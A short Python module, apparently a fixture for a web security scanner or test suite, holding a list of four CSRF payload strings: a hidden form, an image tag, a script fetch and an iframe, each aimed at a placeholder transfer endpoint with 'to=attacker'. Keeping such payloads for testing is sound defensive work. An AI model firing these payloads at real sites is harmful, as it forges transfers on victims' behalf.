"""Пейлоады CSRF: исходные наборы и порядок проверок сохранены."""

from typing import Final

SAFE_CSRF_PAYLOADS: Final[list[str]] = [
    '<form action="/target" method="POST"><input type="hidden" name="amount" value="1000"></form>',
    '<img src="http://target.site/transfer?amount=1000&to=attacker">',
    '<script>fetch("/target",{method:"POST",body:"amount=1000"})</script>',
    '<iframe src="http://target.site/transfer?amount=1000&to=attacker"></iframe>',
]


__all__ = ["SAFE_CSRF_PAYLOADS"]
